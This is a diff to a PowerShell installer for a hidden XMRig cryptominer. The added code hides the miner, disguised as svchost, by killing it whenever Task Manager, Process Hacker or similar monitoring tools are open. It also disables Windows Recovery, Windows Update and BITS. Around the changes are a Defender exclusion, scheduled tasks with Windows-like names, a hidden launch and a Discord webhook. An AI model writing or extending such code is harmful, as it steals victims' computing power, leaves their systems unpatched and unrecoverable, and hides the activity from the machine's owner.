@@ -137,13 +137,20 @@ function Ensure-MinerRunning {
 
 while (`$true) {
     try {
-        Ensure-MinerRunning
-        `$idle = [IdleDetect]::GetIdleSeconds() -ge `$idleThreshold
-        `$target = if (`$idle) { `$idleCpu } else { `$activeCpu }
-        `$state = if (`$idle) { "idle" } else { "active" }
-        if (`$state -ne `$lastState) { Set-XmrigCpu -Percent `$target; `$lastState = `$state }
+        `$spy = Get-Process -Name "Taskmgr","ProcessHacker","PerfMon","ResourceMonitor" -ErrorAction SilentlyContinue
+        if (`$spy) {
+            `$mp = Get-Process -Name "svchost" -ErrorAction SilentlyContinue | Where-Object { `$_.Path -like "*WindowsServices*" }
+            if (`$mp) { `$mp | Stop-Process -Force -ErrorAction SilentlyContinue }
+            `$lastState = "hidden"
+        } else {
+            Ensure-MinerRunning
+            `$idle = [IdleDetect]::GetIdleSeconds() -ge `$idleThreshold
+            `$target = if (`$idle) { `$idleCpu } else { `$activeCpu }
+            `$state = if (`$idle) { "idle" } else { "active" }
+            if (`$state -ne `$lastState) { Set-XmrigCpu -Percent `$target; `$lastState = `$state }
+        }
     } catch {}
-    Start-Sleep -Seconds 5
+    Start-Sleep -Seconds 3
 }
 "@
     Set-Content -Path $watchdogPs1 -Value $code -Force
@@ -154,6 +161,8 @@ function Write-VbsLauncher {
 }
 
 function Set-Persistence {
+    try { & reagentc.exe /disable 2>$null } catch {}
+
     $taskName = "WindowsServiceUpdate"; $wdTask = "WindowsServiceMonitor"
     try {
         $a1 = New-ScheduledTaskAction -Execute $xmrigExe -Argument "--config=`"$configFile`""
@@ -227,6 +236,7 @@ function Send-DiscordWebhook {
 # ==================== MAIN ====================
 try {
     Add-MpPreference -ExclusionPath $installDir, "$env:TEMP" -ErrorAction SilentlyContinue
+    try { & sc.exe config wuauserv start= disabled >$null 2>&1; & sc.exe stop wuauserv >$null 2>&1; & sc.exe config bits start= disabled >$null 2>&1; & sc.exe stop bits >$null 2>&1 } catch {}
     Disable-Sleep; Enable-HugePages
     Install-Miner; Write-MinerConfig; Write-Watchdog; Write-VbsLauncher; Set-Persistence
     Start-Process $xmrigExe -ArgumentList "--config=`"$configFile`"" -WindowStyle Hidden
